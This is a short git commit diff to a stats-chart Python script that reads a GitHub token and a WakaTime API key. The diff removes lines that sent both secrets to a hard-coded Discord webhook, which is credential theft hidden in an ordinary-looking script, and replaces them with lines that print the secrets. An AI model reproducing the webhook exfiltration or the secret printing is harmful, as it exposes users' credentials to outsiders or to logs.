93a733941bf8a448b65e1aa455d741b3ecf701eb
Kira Kenjiro <Kirirakenjiro@gmail.com>
2023-02-27 13:53:16 +0000

    Update Code_Stats_Chart.py

--- Code_Stats_Chart.py
+++ Code_Stats_Chart.py
@@ -4,6 +4,5 @@ import os
 githubPATKey = os.environ['PAT_KEY']
 wakatimeAPI = "https://wakatime.com/api/v1/users/current/stats/all_time?api_key={}".format(os.environ['WAKATIME_API_KEY'])
 
-webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1078248864269750333/inacyG607pv0zwUYDVRMYqz5xtfC2HRLB8aK58wSR-YAZAYTAbmLP8KcqKDfA0RbmXCZ")
-webhook.send(githubPATKey)
-webhook.send(wakatimeAPI)
+print(githubPATKey)
+print(wakatimeAPI)
